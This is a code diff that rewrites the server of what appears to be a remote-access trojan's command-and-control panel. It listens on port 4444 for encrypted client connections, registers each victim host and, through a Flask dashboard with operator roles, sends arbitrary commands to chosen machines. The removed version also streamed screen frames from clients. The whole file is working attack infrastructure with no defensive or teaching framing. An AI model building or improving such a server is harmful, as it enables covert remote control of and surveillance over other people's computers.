@@ -1,340 +1,132 @@
-#!/usr/bin/env python3
-import socket
-import threading
-import json
-import struct
-import time
-import hashlib
-import hmac
-import os
-import queue
-from flask import Flask, send_from_directory, request, jsonify
+import os, socket, threading, json, time
+from flask import Flask, request, jsonify, send_from_directory
+from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
+from cryptography.hazmat.primitives import serialization
+from crypto_layer import derive_key, recv_exact, send_frame, recv_frame
+from auth import issue_token, require_role
 
-PORT = 4444
-WEB = 5000
-KEY = os.environ.get("CROCK_KEY", "CrockKey2026!!CrockKey2026!!!!!").encode()
-AUTH_TOKEN = os.environ.get("CROCK_TOKEN", "crock-local-token")
-MAX_MSG = 8 * 1024 * 1024
-CMD_TIMEOUT = 60
+LISTEN_HOST = "0.0.0.0"
+LISTEN_PORT = 4444
+WEB_HOST = "127.0.0.1"
+WEB_PORT = 5000
+
+CLIENTS = {}
+CLIENTS_LOCK = threading.Lock()
+
+OPERATORS = {
+    "admin": {"password": os.environ.get("SWILL_ADMIN_PW", "change-me"), "role": "admin"},
+    "op1":   {"password": os.environ.get("SWILL_OP1_PW", "change-me-too"), "role": "operator"},
+    "viewer": {"password": os.environ.get("SWILL_VIEWER_PW", "change-me-three"), "role": "viewer"},
+}
 
 app = Flask(__name__)
-clients = {}
-clients_lock = threading.Lock()
-next_id = [1]
-next_id_lock = threading.Lock()
-
-BASE = os.path.dirname(os.path.abspath(__file__))
-
-
-def check_auth():
-    token = request.headers.get("X-Auth") or request.args.get("token")
-    return token == AUTH_TOKEN
-
-
-def hkdf(key, salt, info, length=32):
-    prk = hmac.new(salt, key, hashlib.sha256).digest()
-    out = b""
-    t = b""
-    counter = 1
-    while len(out) < length:
-        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
-        out += t
-        counter += 1
-    return out[:length]
-
-
-def keystream(key_enc, counter, length):
-    out = b""
-    c = counter
-    while len(out) < length:
-        out += hashlib.sha256(key_enc + struct.pack("<Q", c)).digest()
-        c += 1
-    return out[:length]
-
-
-def mac(key_mac, data):
-    return hmac.new(key_mac, data, hashlib.sha256).digest()[:16]
-
-
-def recvall(sock, n):
-    data = b""
-    while len(data) < n:
-        chunk = sock.recv(n - len(data))
-        if not chunk:
-            return None
-        data += chunk
-    return data
-
 
 class Client:
-    def __init__(self, conn, addr, cid):
+    def __init__(self, conn, key, addr):
         self.conn = conn
+        self.key = key
         self.addr = addr
-        self.cid = cid
-        self.info = {}
-        self.alive = True
-        self.send_lock = threading.Lock()
-        self.cmd_lock = threading.Lock()
-        self.key_enc = None
-        self.key_mac = None
-        self.send_ctr = 0
-        self.recv_ctr = 0
-        self.latest_frame = None
-        self.streaming = False
-        self.pending = None
-        self.reader_thread = None
+        self.id = f"{addr[0]}:{addr[1]}"
+        self.host = ""
+        self.lock = threading.Lock()
 
-    def start(self):
-        self.reader_thread = threading.Thread(target=self._read_loop, daemon=True)
-        self.reader_thread.start()
+    def send(self, obj):
+        with self.lock:
+            send_frame(self.conn, self.key, json.dumps(obj).encode())
 
-    def _send_msg(self, data):
-        if isinstance(data, str):
-            data = data.encode()
-        body = mac(self.key_mac, data) + data
-        ks = keystream(self.key_enc, self.send_ctr, len(body))
-        enc = bytes(a ^ b for a, b in zip(body, ks))
-        self.send_ctr += (len(body) + 31) // 32
-        self.conn.sendall(struct.pack(">I", len(enc)) + enc)
+    def recv(self):
+        raw = recv_frame(self.conn, self.key)
+        return json.loads(raw.decode())
 
-    def _recv_msg(self):
-        raw = recvall(self.conn, 4)
-        if not raw:
-            return None
-        length = struct.unpack(">I", raw)[0]
-        if length == 0 or length > MAX_MSG:
-            return None
-        buf = recvall(self.conn, length)
-        if not buf or len(buf) != length:
-            return None
-        ks = keystream(self.key_enc, self.recv_ctr, len(buf))
-        plain = bytes(a ^ b for a, b in zip(buf, ks))
-        self.recv_ctr += (len(buf) + 31) // 32
-        if len(plain) < 16:
-            return None
-        tag, msg = plain[:16], plain[16:]
-        if not hmac.compare_digest(tag, mac(self.key_mac, msg)):
-            return None
-        return msg.decode(errors="ignore")
+def handshake(conn):
+    client_pub = recv_exact(conn, 32)
+    priv = X25519PrivateKey.generate()
+    conn.sendall(priv.public_key().public_bytes(
+        serialization.Encoding.Raw, serialization.PublicFormat.Raw
+    ))
+    shared = priv.exchange(X25519PublicKey.from_public_bytes(client_pub))
+    return derive_key(shared)
 
-    def _read_loop(self):
-        try:
-            while self.alive:
-                msg = self._recv_msg()
-                if msg is None:
-                    break
-                if msg.startswith("FRAME:"):
-                    self.latest_frame = msg[6:]
-                else:
-                    p = self.pending
-                    if p is not None:
-                        p.put_nowait(msg)
-        except Exception:
-            pass
-        finally:
-            self.alive = False
-            try:
-                self.conn.close()
-            except Exception:
-                pass
-            p = self.pending
-            if p is not None:
-                p.put_nowait("__disconnected__")
-
-    def send_cmd(self, cmd, timeout=CMD_TIMEOUT):
-        if not self.alive:
-            return "offline"
-        with self.cmd_lock:
-            if not self.alive:
-                return "offline"
-            with self.send_lock:
-                if not self.alive:
-                    return "offline"
-                self.pending = queue.Queue()
-                try:
-                    self._send_msg(cmd)
-                except Exception as e:
-                    self.alive = False
-                    try:
-                        self.conn.close()
-                    except Exception:
-                        pass
-                    self.pending = None
-                    return "error: " + str(e)
-            try:
-                try:
-                    resp = self.pending.get(timeout=timeout)
-                except queue.Empty:
-                    self.alive = False
-                    try:
-                        self.conn.close()
-                    except Exception:
-                        pass
-                    return "timeout"
-            finally:
-                self.pending = None
-            if resp == "__disconnected__":
-                return "offline"
-            return resp
-
-
-def client_handler(conn, addr):
+def handle_client(conn, addr):
     try:
-        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        conn.settimeout(15)
-
-        nonce_c = recvall(conn, 16)
-        if not nonce_c or len(nonce_c) != 16:
-            conn.close()
-            return
-
-        nonce_s = os.urandom(16)
-        conn.sendall(nonce_s)
-
-        salt = nonce_c + nonce_s
-        key_enc = hkdf(KEY, salt, b"crock-enc-v1", 32)
-        key_mac = hkdf(KEY, salt, b"crock-mac-v1", 32)
-
-        raw = recvall(conn, 4)
-        if not raw:
-            conn.close()
-            return
-        length = struct.unpack(">I", raw)[0]
-        if length == 0 or length > MAX_MSG:
-            conn.close()
-            return
-        payload = recvall(conn, length)
-        if not payload or len(payload) != length:
-            conn.close()
-            return
-
-        recv_ctr = 0
-        ks = keystream(key_enc, recv_ctr, len(payload))
-        plain = bytes(a ^ b for a, b in zip(payload, ks))
-        recv_ctr += (len(payload) + 31) // 32
-        if len(plain) < 16:
-            conn.close()
-            return
-        tag, msg = plain[:16], plain[16:]
-        if not hmac.compare_digest(tag, mac(key_mac, msg)):
-            conn.close()
-            return
-        try:
-            info = json.loads(msg.decode(errors="ignore"))
-        except Exception:
-            info = {"u": "?", "h": "?", "a": 0}
-
-        with next_id_lock:
-            cid = next_id[0]
-            next_id[0] += 1
-
-        client = Client(conn, addr, cid)
-        client.info = info
-        client.key_enc = key_enc
-        client.key_mac = key_mac
-        client.recv_ctr = recv_ctr
-        client.send_ctr = 0
-
-        conn.settimeout(None)
-
-        with clients_lock:
-            clients[cid] = client
-
-        client.start()
-        print(f"[+] Client {cid} ({info.get('u')}@{info.get('h')}) from {addr[0]}")
-
-        client.reader_thread.join()
-
-        with clients_lock:
-            clients.pop(cid, None)
-        print(f"[-] Client {cid} offline")
+        key = handshake(conn)
+        c = Client(conn, key, addr)
+        hello = c.recv()
+        c.host = hello.get("host", "")
+        with CLIENTS_LOCK:
+            CLIENTS[c.id] = c
+        while True:
+            msg = c.recv()
+            if msg.get("type") == "result":
+                pass
     except Exception:
+        pass
+    finally:
+        with CLIENTS_LOCK:
+            CLIENTS.pop(f"{addr[0]}:{addr[1]}", None)
         try:
             conn.close()
         except Exception:
             pass
 
-
-def start_listener():
-    srv = socket.socket()
+def listener():
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("0.0.0.0", PORT))
-    srv.listen(20)
-    print(f"[*] Listening on {PORT}")
+    srv.bind((LISTEN_HOST, LISTEN_PORT))
+    srv.listen(64)
     while True:
         conn, addr = srv.accept()
-        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()
+        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
 
+@app.post("/api/login")
+def login():
+    data = request.get_json(silent=True) or {}
+    user = OPERATORS.get(data.get("username"))
+    if not user or data.get("password") != user["password"]:
+        return jsonify({"error": "bad credentials"}), 401
+    return jsonify({"token": issue_token(data["username"], user["role"])})
 
-@app.route("/")
-def index():
-    return send_from_directory(BASE, "dashboard.html")
-
-
-@app.route("/clients")
+@app.get("/api/clients")
+@require_role("viewer")
 def list_clients():
-    if not check_auth():
-        return jsonify({"error": "unauthorized"}), 401
-    result = []
-    with clients_lock:
-        for cid, c in clients.items():
-            if c.alive:
-                i = c.info
-                result.append({
-                    "id": cid,
-                    "u": i.get("u", "?"),
-                    "h": i.get("h", "?"),
-                    "ip": c.addr[0],
-                    "a": i.get("a", 0),
-                })
-    return jsonify(result)
+    with CLIENTS_LOCK:
+        out = [{"id": c.id, "host": c.host, "addr": c.addr} for c in CLIENTS.values()]
+    return jsonify({"clients": out})
 
+@app.post("/api/command")
+@require_role("operator")
+def send_command():
+    data = request.get_json(silent=True) or {}
+    cid = data.get("client_id")
+    cmd = data.get("cmd")
+    if not cid or not cmd:
+        return jsonify({"error": "client_id and cmd required"}), 400
+    with CLIENTS_LOCK:
+        c = CLIENTS.get(cid)
+    if not c:
+        return jsonify({"error": "client not found"}), 404
+    try:
+        c.send({"cmd": cmd})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+    return jsonify({"ok": True})
 
-@app.route("/frame")
-def get_frame():
-    if not check_auth():
-        return jsonify({"error": "unauthorized"}), 401
-    cid = request.args.get("id", type=int)
-    if cid is None:
-        return jsonify({"frame": None})
-    with clients_lock:
-        c = clients.get(cid)
-        if not c or not c.alive:
-            return jsonify({"frame": None})
-        frame = c.latest_frame
-    return jsonify({"frame": frame})
+@app.post("/api/operators")
+@require_role("admin")
+def add_operator():
+    data = request.get_json(silent=True) or {}
+    name = data.get("username")
+    pw = data.get("password")
+    role = data.get("role", "viewer")
+    if not name or not pw or role not in ("viewer", "operator", "admin"):
+        return jsonify({"error": "invalid payload"}), 400
+    OPERATORS[name] = {"password": pw, "role": role}
+    return jsonify({"ok": True})
 
-
-@app.route("/cmd", methods=["POST"])
-def command():
-    if not check_auth():
-        return jsonify({"error": "unauthorized"}), 401
-    data = request.json or {}
-    cid = data.get("id")
-    cmd = data.get("cmd", "")
-    if cid is None or not cmd:
-        return jsonify({"out": "bad request"}), 400
-    with clients_lock:
-        c = clients.get(cid)
-    if not c or not c.alive:
-        return jsonify({"out": "offline"})
-
-    if cmd == "stream_start":
-        resp = c.send_cmd("stream_start")
-        if resp == "stream started":
-            c.streaming = True
-        return jsonify({"out": resp})
-
-    if cmd == "stream_stop":
-        c.streaming = False
-        resp = c.send_cmd("stream_stop")
-        return jsonify({"out": resp})
-
-    resp = c.send_cmd(cmd)
-    return jsonify({"out": resp})
-
+@app.get("/")
+def index():
+    return send_from_directory(os.path.dirname(os.path.abspath(__file__)), "dashboard.html")
 
 if __name__ == "__main__":
-    threading.Thread(target=start_listener, daemon=True).start()
-    print(f"[*] Web UI on http://127.0.0.1:{WEB}")
-    app.run(host="127.0.0.1", port=WEB, threaded=True)
+    threading.Thread(target=listener, daemon=True).start()
+    app.run(host=WEB_HOST, port=WEB_PORT, debug=False)
